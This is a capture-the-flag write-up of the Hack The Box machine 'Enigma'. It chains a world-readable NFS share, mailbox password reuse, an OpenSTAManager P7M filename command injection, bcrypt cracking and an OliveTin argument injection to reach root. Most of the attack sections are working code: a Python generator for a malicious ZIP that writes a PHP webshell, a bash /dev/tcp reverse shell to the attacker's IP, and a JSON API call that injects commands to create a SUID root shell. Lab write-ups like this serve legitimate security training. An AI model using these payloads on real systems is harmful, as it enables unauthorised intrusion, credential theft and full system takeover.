# Hack The Box — HTB Enigma Writeup

**Difficulty:** Easy  
**OS:** Linux (Ubuntu 22.04)  
**Date Completed:** 2026-07-03  
**Attacker IP (tun0):** 10.10.14.88  
**Target IP:** 10.129.33.67  

---

## Executive Summary

**Enigma** is a multi-stage mail/application server featuring:
1. **NFS enumeration** → unauthenticated export mount → PDF credentials
2. **Password reuse** → webmail access → IMAP information gathering → third vhost discovery
3. **OpenSTAManager CVE-2025-69212** → P7M command injection → www-data RCE
4. **Database credential extraction** → bcrypt password cracking → user lateral movement
5. **OliveTin command injection** → root arbitrary command execution

**Kill Chain:** NFS → IMAP → OpenSTAManager → www-data → MySQL → su haris → OliveTin → root

**User Flag:** `32525f40e5e6c1f812460740955e31cb`  
**Root Flag:** `d5198b164056317f3577b19bf947cd4a`

---

## 0. Setup & Network Configuration

The HTB VPN (tun0) has an MTU black-hole at 1500. Large packets (TLS ClientHello) are silently dropped with no ICMP fragmentation-needed response, causing IMAP/HTTPS connections to hang indefinitely while plain TCP works.

**Fix:**
```bash
sudo ip link set dev tun0 mtu 1300
```

**Hostname configuration:**
```bash
echo "10.129.33.67 enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 2000 -sV -sC 10.129.33.67
```

**Results:**
```
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd
993/tcp   open  imaps    Dovecot imapd (TLS)
995/tcp   open  pop3s    Dovecot pop3d (TLS)
2049/tcp  open  nfs_acl  (RPC #100227)
111/tcp   open  rpcbind  (RPC #100000)
+ mountd, nlockmgr, status (NFS machinery)
```

**Key Findings:**
- **Mail stack:** POP3, IMAP, TLS support, Dovecot backend
- **NFS:** rpcbind + NFS exposed
- **Web:** nginx (likely Roundcube webmail + OpenSTAManager)
- **SSH:** publickey-only (noted from banner)

---

## 2. NFS Enumeration → Credentials

### Export Discovery

```bash
showmount -e 10.129.33.67
# Export list for 10.129.33.67:
# /srv/nfs/onboarding *
```

The `*` indicates **world-readable NFS export** (no authentication required).

### Mount & Extract

```bash
sudo mkdir -p /mnt/onboarding
sudo mount -t nfs -o vers=3,nolock 10.129.33.67:/srv/nfs/onboarding /mnt/onboarding
pdftotext /mnt/onboarding/New_Employee_Access.pdf -
```

**Output:**
```
Employee: Kevin Mitchell
Department: Operations
Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

**Key:** Credentials are marked "Please change your password upon first login" but are **reused across systems** (common corporate default).

---

## 3. IMAP Enumeration & Password Reuse

### Kevin's Mailbox

```bash
curl -s --url "imaps://10.129.33.67/" --user "kevin:Enigma2024!" -k
# * LIST (\NoInferiors \UnMarked \Sent) "/" Sent
# * LIST (\NoInferiors \UnMarked \Trash) "/" Trash
# * LIST (\HasNoChildren) "/" INBOX
```

**First email** (MAILINDEX=1) is from sarah@enigma.htb — "Welcome to Enigma Corp, Kevin!"

**Key Finding:** Discover second user: `sarah@enigma.htb`

### Sarah's Mailbox via Password Reuse

```bash
curl -s --url "imaps://10.129.33.67/" --user "sarah:Enigma2024!" -k
# * LIST (\NoInferiors \UnMarked \Trash) "/" Trash
# * LIST (\HasNoChildren) "/" INBOX
```

✓ **Password reuse confirmed!**

### Sarah's Email — OpenSTAManager Credentials

```bash
curl -s --url "imaps://10.129.33.67/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
```

**Output:**
```
From: it@enigma.htb
Subject: Re: OpenSTAManager Access Request
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

**Key:** Third vhost discovered + admin credentials obtained.

---

## 4. Foothold — OpenSTAManager CVE-2025-69212 (P7M Command Injection)

### Version Check

```bash
curl -s http://support_001.enigma.htb/ | grep -oiE 'v=2\.[0-9.]+'
# v=2.9.8
```

**Vulnerability Status:** OpenSTAManager ≤ 2.9.8 is vulnerable.

### Vulnerability Details

**Location:** `/src/Util/XML.php:100`

OpenSTAManager shells out to OpenSSL with an unescaped filename when importing `.p7m` (signed e-invoice) files:

```php
exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', ...);
```

**Attack Vector:**
- Upload a ZIP file containing a `.p7m` entry with a malicious name
- PHP's `ZipArchive::extractTo()` splits entry names on `/`, so injected commands must contain no slashes
- Use this to stage a slash-free webshell, then leverage the webshell for RCE

### Crafting the Exploit

**Payload logic:**
```
Entry name: invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > 0xsh.php;echo ".p7m

When executed, the assembled command becomes:
openssl smime -verify -noverify -in "invoice.p7m" ; \
cd files && echo '<?php system($_GET["c"]); ?>' > 0xsh.php ; \
echo ".p7m" -inform DER -out "<output>"

Parsing:
- "invoice.p7m" → valid filename in quotes
- ; → command separator
- cd files && echo ... > 0xsh.php → our webshell injection
- ;echo ".p7m → rebalances quotes
```

**Python zip generator:**
```python
import zipfile

webshell = '<?php system($_GET["c"]); ?>'
cmd   = "cd files && echo '%s' > 0xsh.php" % webshell
fname = 'invoice.p7m";%s;echo ".p7m' % cmd

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(fname, 'AAAA')
```

### Authentication & Upload

```bash
# Login
curl -s -i -c osm.cookies \
  -d "username=admin&password=Ne3s4rtars78s" \
  "http://support_001.enigma.htb/index.php?op=login"
# HTTP/1.1 302 Found → Location: /controller.php?id_module=1

# Upload to invoice import plugin (id_module=14, id_plugin=48)
curl -s -b osm.cookies \
  -F "op=save" -F "id_module=14" -F "id_plugin=48" -F "ajax=1" \
  -F "blob1=@exploit.zip;type=application/zip;filename=exploit.zip" \
  "http://support_001.enigma.htb/actions.php"
# {"id":1}
# ... error page (expected — injection already executed)
```

### RCE Confirmation

```bash
curl "http://support_001.enigma.htb/files/0xsh.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✓ **Webshell created. RCE as www-data confirmed.**

---

## 5. Reverse Shell & Stabilization

### Listener

```bash
nc -lvnp 9001
```

### Trigger Reverse Shell

```bash
RS='bash -c "bash -i >& /dev/tcp/10.10.14.88/9001 0>&1"'
ENC=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$RS")
curl "http://support_001.enigma.htb/files/0xsh.php?c=$ENC"
```

### TTY Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
# stty raw -echo; fg
```

---

## 6. Database Access → Credential Extraction

### Extract DB Credentials

```bash
grep -iE 'db_username|db_password|db_name' /var/www/html/openstamanager/config.inc.php
# $db_username = 'brollin';
# $db_password = 'Fri3nds@9099';
# $db_name     = 'openstamanager';
```

### Dump Application Users

```bash
mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e 'SELECT username,password FROM zz_users;'
# admin | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
# haris | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

### Crack haris bcrypt

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
# bestfriends (haris)
```

---

## 7. Lateral Movement: www-data → haris

```bash
su haris
# Password: bestfriends
id
# uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
cat ~/user.txt
# 32525f40e5e6c1f812460740955e31cb
```

**User flag obtained.**

---

## 8. Privilege Escalation — OliveTin RCE

### Service Discovery

```bash
ss -lntp | grep 1337
# LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
ps -eo user,pid,cmd | grep '[O]liveTin'
# root  <pid>  /usr/local/bin/OliveTin
```

**OliveTin (predefined shell commands from web interface) runs as root on loopback:1337.**

### Configuration Analysis

```bash
cat /etc/OliveTin/config.yaml | grep -A 10 "Backup Database"
```

**Action Definition:**
```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user     # type: ascii_identifier (safe)
    - name: db_pass     # type: password (NOT SANITIZED ← injection point)
    - name: db_name     # type: ascii_identifier (safe)
```

**Vulnerability:** `db_pass` argument type is `password`, which allows unrestricted characters (quotes, semicolons, spaces, slashes, etc.). When interpolated into the shell command, it becomes a direct command injection.

### Crafting the Injection

**Payload:**
```
x'; cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash #
```

**Assembled command:**
```bash
mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash #' production > /opt/backups/backup.sql
```

**Execution flow:**
- `mysqldump -u backup_svc -p'x'` → auth fails, exits (timeout ~3s)
- `; cp /bin/bash /tmp/rootbash` → copy bash as root
- `; chmod 4777 /tmp/rootbash` → set SUID and rwx
- `#` → comments out leftover redirect and quotes

### OliveTin API Call

OliveTin 3000.x uses ConnectRPC (POST with JSON, not GET).

```python
import urllib.request, json

url = "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction"
payload = {
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "x'; cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash #"},
        {"name": "db_name", "value": "production"}
    ]
}

req = urllib.request.Request(url, data=json.dumps(payload).encode(),
                             headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req, timeout=12).read().decode())
# {"executionTrackingId":"6fe2fbc0-c743-49e3-9ac3-49eb4960b85c"}
```

### SUID Bash & Root Access

```bash
ls -la /tmp/rootbash
# -rwsrwxrwx 1 root root 1446024 ... /tmp/rootbash

/tmp/rootbash -p
id
# uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root) groups=1000(haris),100(users)
cat /root/root.txt
# d5198b164056317f3577b19bf947cd4a
```

**Root flag obtained.**

---

## Key Vulnerabilities Summary

| # | Vulnerability | Component | Impact |
|---|---|---|---|
| 1 | World-readable NFS export | NFS /srv/nfs/onboarding | Credential disclosure |
| 2 | Password reuse | Mail system + AD | Lateral movement |
| 3 | CVE-2025-69212 | OpenSTAManager 2.9.8 | RCE as www-data |
| 4 | Bcrypt hash cracking | Database backup | User credential recovery |
| 5 | Command injection | OliveTin 3000.10.0 | Root RCE |

---

## Tools & Techniques Used

**Reconnaissance:** nmap, showmount, curl, pdftotext  
**Exploitation:** Python (zipfile, urllib, json), bash, openssl  
**Post-Exploitation:** mysql, john (bcrypt), su, grep, ss  
**Reverse Shell:** bash TCP socket, netcat  

---

## Lessons Learned

1. **NFS is often overlooked** — always run `showmount -e` even if it's not in initial nmap
2. **Password reuse is universal** — onboarding credentials work across multiple systems
3. **Argument sanitization matters** — `type: password` is not inherently safe; context matters
4. **Loopback services run as root** — check high ports on localhost; they often have root privileges
5. **Command injection bypasses filters** — even if some arguments are sanitized, a single unsanitized argument breaks the whole shell command

---

**Report Generated:** 2026-07-03  
**Time to Root:** ~2 hours  
**Difficulty Assessment:** Easy (straightforward exploitation once entry point found)
